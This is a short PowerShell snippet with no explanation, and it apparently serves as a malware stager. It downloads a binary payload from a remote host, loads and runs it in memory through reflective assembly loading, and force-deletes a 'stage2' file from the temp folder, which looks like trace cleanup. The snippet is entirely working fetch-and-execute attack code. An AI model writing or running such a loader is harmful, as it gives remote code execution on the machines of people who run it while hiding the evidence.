$ManagedBytes = (New-Object System.Net.WebClient).DownloadData('http://internal.corp:80/payload.bin')
[Reflection.Assembly]::Load($ManagedBytes)
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
